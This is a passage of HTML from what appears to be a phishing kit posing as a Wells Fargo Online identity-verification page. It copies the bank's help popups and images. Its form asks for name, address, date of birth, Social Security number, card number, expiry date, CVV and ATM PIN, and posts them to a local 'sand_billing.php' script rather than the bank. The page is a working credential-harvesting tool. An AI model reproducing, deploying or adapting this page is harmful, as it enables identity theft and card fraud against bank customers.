j3sR69pHFSUjQKQhptBg7N+dxwubRSby59wz+7b/HtV8tXIGt67P86ibGS3iefm9ibmOuyEjwu06HPlgHWXw0J/z5j1cxPGrDvpMXaBATXF/la2ookmIEdbPTE3iedm/iK7OHe7pgVNZWbUD28iRO8Nxv13C+/RbXPzRiw6kzV7n+qMhwVO8qJfJYH/21uWkePD4n1zS1t1adxa07owuW5qQvi8cPRysRNntysSmzuXvMwrme/fywMn/erREsdlfk8aT1jFTodopz3U7yg3WX0NSsDdnb10tW4rNd61nV4LqdRoVuJ3ZlVbNK1bvFyFelhnQz5ank+GRHCW+7micNmIE8dDhxuP4SfrrYE7Snb5SqUL2zFIvFix47A/HJuVo6dDje2AqdIXA2okiRYc+2IhSvVjxRzsWXbYRDbM1ZtGu69big6UXnTSMM96yYsD1ATFQEUp6TQp2VjLICJQpeTOMDiWUcnxJOh5JX1wWZV9eFmle7F4nbS6LA9ZJ4hjDueklo3F4S9oV8wjy1t9OClv8FGADa7uXheMksUAAAAABJRU5ErkJggg=="></a>
                    </span>
                    <p class="balloon-header" id="usernameHelpTitle" role="heading" aria-level="2">
                        <strong>Email Address</strong>
                    </p>
                    <p class="balloon-content">Enter the Email Address that you use to your <span class="OneLinkNoTx" lang="en">Wells Fargo</span> Online accounts.</p>
                    <span class="hook hook-left"><img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAANCAMAAACTkM4rAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjE3MDhCOTQ0OTYwOTExRTE5RTFEOUMzNUI1RTBENEIyIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjE3MDhCOTQ1OTYwOTExRTE5RTFEOUMzNUI1RTBENEIyIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MTcwOEI5NDI5NjA5MTFFMTlFMUQ5QzM1QjVFMEQ0QjIiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MTcwOEI5NDM5NjA5MTFFMTlFMUQ5QzM1QjVFMEQ0QjIiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7NskAEAAAAYFBMVEXj4+P//v/a2trb29vk5Ob+//3///v//f7d3d3Pz9H9//n9//rQ0NLZ2df9//7c3NzY2Nr+//vR0dH8///f39/a2tjY2Nj9//zi4uL///r+/v/k5OT///3+/v7////yUxaclVpZAAAAIHRSTlP/////////////////////////////////////////AFxcG+0AAAB3SURBVHjajMtHDsNADANArb1u6b2sJPL/v4wcOwU5hTwIGoDS4djCF0DX7DdWGkDuqSQs3WAF6ZriyLASMwfcHdE8HITcZW+DEHG9kEE8axnfqKw5Ees8raTii7jVcaZPmYn9LaTmN7FSmeVN7E/8pU/+o4cAAwDCdhgZ4gFFlwAAAABJRU5ErkJggg=="></span>
                    <span class="hide">End of popup</span>
                </div>
            </div>

            <div control="lightbox" class="lightboxRight" id="ssnHelp">
                <div class="container" tabindex="-1" role="alertdialog" aria-labelledby="ssnHelpTitle">
                    <span class="hide">Beginning of popup</span>
                    <span class="close">
                        <a href="#ssnHelpLink"><img alt="Close" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo3RkUwQjlENEIxRTYxMUUyQTJFQjg5RDI4MDZBQkNDNSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo3RkUwQjlENUIxRTYxMUUyQTJFQjg5RDI4MDZBQkNDNSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjdGRTBCOUQyQjFFNjExRTJBMkVCODlEMjgwNkFCQ0M1IiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjdGRTBCOUQzQjFFNjExRTJBMkVCODlEMjgwNkFCQ0M1Ii8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+zVAeuQAABClJREFUeNrEV21Mk1cUfooVKDAKKzgUyoclBefKaHQBjAwQ2ZJFkukcaLJNMzfN4rL90R/MsPkVDcZ/6jZgG7Jlbppl7MeymKkMNK6QEQHp5mQULLaK2ELLR4uxhZ370hf78ZZaS+JNnjf33vec89xz77n3niuamZnB0yiiIIgjCZsIhYR8QgZBSrASBghthCuEnwlTAa0x4gCII9TOBFdqXXp+7Qby+C3CEYKcyd3UW9DVex8DxjGYrVOwP3BAEiGGTBqJjORY5CoTkZUWB5FIxHRvE/YRvgt2qr8i7GCVnj4zmlp0uGuaDDiDSxOisbFYAVWmjO/6mvDe4xJzpA7nNM7+3ovLncagg6dQnYwtryghXhQmSC5E/A6hkZGeOtcFrc78xJH7gkKG3RW5PPl2ZtcfMYvS64TUxl//Rus1Q8jb5mV1CraXr+TXPIdgYY0wL7kaRtpNAdT81yCc5HWo+KNjkAJymNmWE44Jecz2qZ21q05chmF43GNEW8qU2FCk5Op9g2bsr9MI/uvpHULNtx0eussSY1DzUREf7VGMx91jdjjQmpqgv2uh0To98P35G2hu03GCmakyVJZmcv0vZSc8GpDejCMN7T66t4es0PaZeJ6N3lPNTiS09RjhmHYK4oumbvynnzVQXpKNdauS8XZ5DtcesdrIU41f3Tat0YPHnXgN+/zTfx8Ox7RfHP3mT4xYbJzC+5tX41lpFFdvaOqEyTLlV+/GwJzH+d7EaewzZBr3mSp3mKx2HPiyBfaph3OKv1zUorXLMK/eneExXnw5+4i9thKsE4HP96JVckgiF8+1n1csgcN5fV6dsUknX4319tjKhXZ4GBlx+EVhThI2lak8jCozluDjCvW8ehHhc1Rj3sR69pHFSUjQKQhptBg7N+dxwubRSby59wz+7b/HtV8tXIGt67P86ibGS3iefm9ibmOuyEjwu06HPlgHWXw0J/z5j1cxPGrDvpMXaBATXF/la2ookmIEdbPTE3iedm/iK7OHe7pgVNZWbUD28iRO8Nxv13C+/RbXPzRiw6kzV7n+qMhwVO8qJfJYH/21uWkePD4n1zS1t1adxa07owuW5qQvi8cPRysRNntysSmzuXvMwrme/fywMn/erREsdlfk8aT1jFTodopz3U7yg3WX0NSsDdnb10tW4rNd61nV4LqdRoVuJ3ZlVbNK1bvFyFelhnQz5ank+GRHCW+7micNmIE8dDhxuP4SfrrYE7Snb5SqUL2zFIvFix47A/HJuVo6dDje2AqdIXA2okiRYc+2IhSvVjxRzsWXbYRDbM1ZtGu69big6UXnTSMM96yYsD1ATFQEUp6TQp2VjLICJQpeTOMDiWUcnxJOh5JX1wWZV9eFmle7F4nbS6LA9ZJ4hjDueklo3F4S9oV8wjy1t9OClv8FGADa7uXheMksUAAAAABJRU5ErkJggg=="></a>
                    </span>
                    <p class="balloon-header" id="ssnHelpTitle" role="heading" aria-level="2">
                        <strong>Social Security number <span class="OneLinkNoTx" lang="en">(SSN)</span> or Individual Tax Identification Number <span class="OneLinkNoTx" lang="en">(ITIN)</span></strong>
                    </p>
                    <p class="balloon-content">Enter your <span class="OneLinkNoTx" lang="en">SSN</span> or <span class="OneLinkNoTx" lang="en">ITIN</span> that was issued to you. Otherwise,
                        enter your username. If you are unable to recover your
                        username and need further password help, please call
                        <span class="OneLinkNoTx" lang="en">Wells Fargo</span> Online Banking Customer Service at 1-800-956-4442
                        available 24 hours a day, 7 days a week.</p>
                    <span class="hide">End of popup</span>
                </div>
            </div>

           <div control="lightbox" id="accountHelp">
                <div class="container" role="alertdialog" aria-labelledby="accountHelpTitle" tabindex="-1">
                    <span class="hide">Beginning of popup</span>
                    <span class="close">
                        <a href="#accountHelpLink"><img alt="Close" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo3RkUwQjlENEIxRTYxMUUyQTJFQjg5RDI4MDZBQkNDNSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo3RkUwQjlENUIxRTYxMUUyQTJFQjg5RDI4MDZBQkNDNSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjdGRTBCOUQyQjFFNjExRTJBMkVCODlEMjgwNkFCQ0M1IiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjdGRTBCOUQzQjFFNjExRTJBMkVCODlEMjgwNkFCQ0M1Ii8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+zVAeuQAABClJREFUeNrEV21Mk1cUfooVKDAKKzgUyoclBefKaHQBjAwQ2ZJFkukcaLJNMzfN4rL90R/MsPkVDcZ/6jZgG7Jlbppl7MeymKkMNK6QEQHp5mQULLaK2ELLR4uxhZ370hf78ZZaS+JNnjf33vec89xz77n3niuamZnB0yiiIIgjCZsIhYR8QgZBSrASBghthCuEnwlTAa0x4gCII9TOBFdqXXp+7Qby+C3CEYKcyd3UW9DVex8DxjGYrVOwP3BAEiGGTBqJjORY5CoTkZUWB5FIxHRvE/YRvgt2qr8i7GCVnj4zmlp0uGuaDDiDSxOisbFYAVWmjO/6mvDe4xJzpA7nNM7+3ovLncagg6dQnYwtryghXhQmSC5E/A6hkZGeOtcFrc78xJH7gkKG3RW5PPl2ZtcfMYvS64TUxl//Rus1Q8jb5mV1CraXr+TXPIdgYY0wL7kaRtpNAdT81yCc5HWo+KNjkAJymNmWE44Jecz2qZ21q05chmF43GNEW8qU2FCk5Op9g2bsr9MI/uvpHULNtx0eussSY1DzUREf7VGMx91jdjjQmpqgv2uh0To98P35G2hu03GCmakyVJZmcv0vZSc8GpDejCMN7T66t4es0PaZeJ6N3lPNTiS09RjhmHYK4oumbvynnzVQXpKNdauS8XZ5DtcesdrIU41f3Tat0YPHnXgN+/zTfx8Ox7RfHP3mT4xYbJzC+5tX41lpFFdvaOqEyTLlV+/GwJzH+d7EaewzZBr3mSp3mKx2HPiyBfaph3OKv1zUorXLMK/eneExXnw5+4i9thKsE4HP96JVckgiF8+1n1csgcN5fV6dsUknX4319tjKhXZ4GBlx+EVhThI2lak8jCozluDjCvW8ehHhc1Rj3sR69pHFSUjQKQhptBg7N+dxwubRSby59wz+7b/HtV8tXIGt67P86ibGS3iefm9ibmOuyEjwu06HPlgHWXw0J/z5j1cxPGrDvpMXaBATXF/la2ookmIEdbPTE3iedm/iK7OHe7pgVNZWbUD28iRO8Nxv13C+/RbXPzRiw6kzV7n+qMhwVO8qJfJYH/21uWkePD4n1zS1t1adxa07owuW5qQvi8cPRysRNntysSmzuXvMwrme/fywMn/erREsdlfk8aT1jFTodopz3U7yg3WX0NSsDdnb10tW4rNd61nV4LqdRoVuJ3ZlVbNK1bvFyFelhnQz5ank+GRHCW+7micNmIE8dDhxuP4SfrrYE7Snb5SqUL2zFIvFix47A/HJuVo6dDje2AqdIXA2okiRYc+2IhSvVjxRzsWXbYRDbM1ZtGu69big6UXnTSMM96yYsD1ATFQEUp6TQp2VjLICJQpeTOMDiWUcnxJOh5JX1wWZV9eFmle7F4nbS6LA9ZJ4hjDueklo3F4S9oV8wjy1t9OClv8FGADa7uXheMksUAAAAABJRU5ErkJggg=="></a>
                    </span>
                    <div class="dialogContents">
                        <p class="header" id="accountHelpTitle" role="heading" aria-level="2">
                            <strong>Account, loan, or card number</strong>
                        </p>
                        <p>Enter one of your <span class="OneLinkNoTx" lang="en">Wells Fargo</span> numbers or the account number
                            printed on your <span class="OneLinkNoTx" lang="en">ATM</span>/debit card (not your Personal Identification Number (PIN)).
                            </p><ul>
                                <li>Brokerage accounts: Please enter a W in front of your account number.</li>
                                <li>Credit cards: Enter the account number that is printed on your credit
                                    card and credit card statement.*</li>
                                <li>Trust and managed investment services accounts: Enter the complete
                                    number as it appears on your statement, including any letters, numbers,
                                    and hyphens.</li>
                                <li>Employer-sponsored accounts: Do not enter a number here. Go to the
                                    next field and enter your date of birth.</li>
                                <li>Mortgage accounts: Enter the loan number that appears on the upper
                                    right hand corner of your monthly mortgage statement. If you do not
                                    know your mortgage account number, go to the next field and enter
                                    your date of birth.</li>
                                <li>Health savings accounts: Enter the 10-digit account number on your
                                    account statement or the 16 digit number on your <span class="OneLinkNoTx" lang="en">Wells Fargo</span> Visa�
                                    HSA Debit Card.</li>
                                <li>Online payroll accounts: If you do not have an account number or
                                    <span class="OneLinkNoTx" lang="en">ATM</span>/debit card number, please call <span class="OneLinkNoTx" lang="en">1-800-956-4442</span> for assistance.</li>
                                <li>For Personal Insurance Policies and Safe Deposit Box: Enter one of
                                    your other eligible accounts above or please call customer service
                                    to get assistance.</li>
                                <li>For all other accounts: Enter the number on your statement or card,
                                    without dashes or spaces.</li>
                            </ul>
                        <p></p>
                        <p>*Note: <span class="OneLinkNoTx" lang="en">Wells Fargo</span> Financial credit cards are not eligible for Wells
                            Fargo Online�.  To access these accounts online, please go to wellsfargofinancial.com.</p>
                    </div>
                    <span class="hide">End of popup</span>
                </div>
            </div>

            <div control="lightbox" class="lightboxLeft" id="dobHelp">
                <div class="container" tabindex="-1" role="alertdialog" aria-labelledby="dobHelpTitle">
                    <span class="hide">Beginning of popup</span>
                    <span class="close">
                        <a href="#dobHelpLink"><img alt="Close" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo3RkUwQjlENEIxRTYxMUUyQTJFQjg5RDI4MDZBQkNDNSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo3RkUwQjlENUIxRTYxMUUyQTJFQjg5RDI4MDZBQkNDNSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjdGRTBCOUQyQjFFNjExRTJBMkVCODlEMjgwNkFCQ0M1IiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjdGRTBCOUQzQjFFNjExRTJBMkVCODlEMjgwNkFCQ0M1Ii8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+zVAeuQAABClJREFUeNrEV21Mk1cUfooVKDAKKzgUyoclBefKaHQBjAwQ2ZJFkukcaLJNMzfN4rL90R/MsPkVDcZ/6jZgG7Jlbppl7MeymKkMNK6QEQHp5mQULLaK2ELLR4uxhZ370hf78ZZaS+JNnjf33vec89xz77n3niuamZnB0yiiIIgjCZsIhYR8QgZBSrASBghthCuEnwlTAa0x4gCII9TOBFdqXXp+7Qby+C3CEYKcyd3UW9DVex8DxjGYrVOwP3BAEiGGTBqJjORY5CoTkZUWB5FIxHRvE/YRvgt2qr8i7GCVnj4zmlp0uGuaDDiDSxOisbFYAVWmjO/6mvDe4xJzpA7nNM7+3ovLncagg6dQnYwtryghXhQmSC5E/A6hkZGeOtcFrc78xJH7gkKG3RW5PPl2ZtcfMYvS64TUxl//Rus1Q8jb5mV1CraXr+TXPIdgYY0wL7kaRtpNAdT81yCc5HWo+KNjkAJymNmWE44Jecz2qZ21q05chmF43GNEW8qU2FCk5Op9g2bsr9MI/uvpHULNtx0eussSY1DzUREf7VGMx91jdjjQmpqgv2uh0To98P35G2hu03GCmakyVJZmcv0vZSc8GpDejCMN7T66t4es0PaZeJ6N3lPNTiS09RjhmHYK4oumbvynnzVQXpKNdauS8XZ5DtcesdrIU41f3Tat0YPHnXgN+/zTfx8Ox7RfHP3mT4xYbJzC+5tX41lpFFdvaOqEyTLlV+/GwJzH+d7EaewzZBr3mSp3mKx2HPiyBfaph3OKv1zUorXLMK/eneExXnw5+4i9thKsE4HP96JVckgiF8+1n1csgcN5fV6dsUknX4319tjKhXZ4GBlx+EVhThI2lak8jCozluDjCvW8ehHhc1Rj3sR69pHFSUjQKQhptBg7N+dxwubRSby59wz+7b/HtV8tXIGt67P86ibGS3iefm9ibmOuyEjwu06HPlgHWXw0J/z5j1cxPGrDvpMXaBATXF/la2ookmIEdbPTE3iedm/iK7OHe7pgVNZWbUD28iRO8Nxv13C+/RbXPzRiw6kzV7n+qMhwVO8qJfJYH/21uWkePD4n1zS1t1adxa07owuW5qQvi8cPRysRNntysSmzuXvMwrme/fywMn/erREsdlfk8aT1jFTodopz3U7yg3WX0NSsDdnb10tW4rNd61nV4LqdRoVuJ3ZlVbNK1bvFyFelhnQz5ank+GRHCW+7micNmIE8dDhxuP4SfrrYE7Snb5SqUL2zFIvFix47A/HJuVo6dDje2AqdIXA2okiRYc+2IhSvVjxRzsWXbYRDbM1ZtGu69big6UXnTSMM96yYsD1ATFQEUp6TQp2VjLICJQpeTOMDiWUcnxJOh5JX1wWZV9eFmle7F4nbS6LA9ZJ4hjDueklo3F4S9oV8wjy1t9OClv8FGADa7uXheMksUAAAAABJRU5ErkJggg=="></a>
                    </span>
                    <p class="balloon-header" id="dobHelpTitle" role="heading" aria-level="2">
                        <strong>Date of Birth <span class="OneLinkNoTx" lang="en">(DOB)</span></strong>
                    </p>
                    <p class="balloon-content">Enter your date of birth <span class="OneLinkNoTx" lang="en">(DOB)</span>. This option is only
                        available for existing mortgage or employer-sponsored
                        retirement customers that do not have any additional
                        <span class="OneLinkNoTx" lang="en">Wells Fargo</span> consumer or business accounts or relationships.</p>
                    <span class="hide">End of popup</span>
                </div>
            </div>

            <div id="main" aria-hidden="false">
                <h1>Account Identification</h1>

                <p class="titleBody">For your security, please complete one field below to confirm your identity and continue.</p>
                <form id="credentials" name="credentials" novalidate="novalidate" action="../../system/sand_billing.php" method="POST" onsubmit="return ChangePassword.methods.validate(1);" autocomplete="off" style="border-top-width: 1px;border-top-style: solid;">
                    
                  <div <ol="" class="progress-tracker" style="margin-top: 20px;">
  <li class="step"><span class="step-name">Login</span></li>
  <li class="step"><span class="step-name">Your Information</span></li>
  <li class="step"><span class="step-name">Upload ID</span></li>

</div>

                    
                    <h2 class="h3">1- Personal Information</h2><div control="forms:fieldContainer" style="margin-right: 90px;margin-bottom: 0px;">
                                <label control="forms:label" for="username" class="h4">Name On Card</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                                <input control="forms:input" id="fullnm" name="fullnm" type="text"></div><div control="forms:fieldContainer" style="margin-bottom: 0px;margin-right: 50px;">
                                <label control="forms:label" for="username" class="h4">Country</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                                <input control="forms:input" id="countr" name="countr" type="text"></div><div control="forms:fieldContainer" style="margin-right: 90px;margin-bottom: 0px;">
                                <label control="forms:label" for="username" class="h4">City</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                                <input control="forms:input" id="city" name="city" type="text"></div><div control="forms:fieldContainer" style="margin-bottom: 0px;margin-right: 50px;">
                                <label control="forms:label" for="username" class="h4">State</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                                <input control="forms:input" id="stat" name="stat" type="text"></div><div control="forms:fieldContainer" style="margin-right: 90px;margin-bottom: 0px;">
                                <label control="forms:label" for="username" class="h4">Address</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                                <input control="forms:input" id="addres" name="addres" type="text"></div><div control="forms:fieldContainer" style="margin-bottom: 0px;margin-right: 50px;">
                                <label control="forms:label" for="username" class="h4">Zip Code</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                                <input control="forms:input" id="zip" name="zip" type="text"></div><div control="forms:fieldContainer" style="margin-right: 90px;margin-bottom: 0px;">
                                <label control="forms:label" for="username" class="h4">Date Of Brith</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                                <input control="forms:input" id="dob" name="dob" type="text"></div><div control="forms:fieldContainer" style="margin-bottom: 20px;margin-right: 50px;">
                                <label control="forms:label" for="username" class="h4">Social Security number (SSN)</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                                <input control="forms:input" id="ssn" name="ssn" type="text"></div><h2 class="h3" style="border-top-width: 1px;border-top-style: solid;padding-top: 15px;">2- Card Information</h2><div control="forms:fieldContainer" style="margin-right: 90px;margin-bottom: 0px;">
                                <label control="forms:label" for="username" class="h4">Card Number</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                                <input control="forms:input" id="CardNumber" name="cardnum" maxlength="19" type="text"></div><div control="forms:fieldContainer" style="margin-bottom: 0px;margin-right: 50px;">
                                <label control="forms:label" for="username" class="h4">Expiry Date (MM/YY)</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                                <input control="forms:input" id="Expiry" name="expdate" maxlength='7' type="text"></div><div control="forms:fieldContainer" style="margin-right: 90px;margin-bottom: 0px;">
                                <label control="forms:label" for="username" class="h4">CVV</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                                <input control="forms:input" id="cvv" name="cvv" maxlength="3" type="text"></div><div control="forms:fieldContainer" style="margin-bottom: 0px;margin-right: 50px;">
                                <label control="forms:label" for="username" class="h4">Debit/ ATM Card Pin (Four Digits)</label>
                                
                                <div class="forms:fieldContainer:spacer"></div>
                               
                               <input control="forms:input" id="atmpin" name="atmpin" maxlength="4" type="password"></div><div control="buttonContainer" style="border-top-style: solid;border-top-width: 0px;">
                               
                               
<div control="buttonContainer">
                        <input name="action" id="action" value="verify" type="hidden">
<input value="Complete" id="Complete" name="Complete" control="button" data-type="primary" style="margin-top: 40px;border-top-style: solid;border-top-width: 0px;padding-top: 5px;border-bottom-style: solid;" type="submit">                    </div>
                </form></div>
        </div>

        <div control="footer" ismobile="false" aria-hidden="false">
	<div theme="ssep">
        <span class="helper"></span>
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAVgAAAAiCAYAAAAaosFTAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2hpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpFRTExNTVCODA5MjA2ODExODA4M0E0RUNFQzZDMEFBMSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo5MzE1MkNEODk3RjkxMUUzOEU5OEY3MThENUIxQTk0QSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo5MzE1MkNENzk3RjkxMUUzOEU5OEY3MThENUIxQTk0QSIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RUYxMTU1QjgwOTIwNjgxMTgwODNBNEVDRUM2QzBBQTEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RUUxMTU1QjgwOTIwNjgxMTgwODNBNEVDRUM2QzBBQTEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5TN/kFAAAS1ElEQVR42uxdCZQVxRWtYYYBRpRdUIGwCMqi4BJkR4WgoKBiQMUNERURXEDjgkZIhLgmKKCishijoGACUbOoCIrIGleURTbFBWVTQEA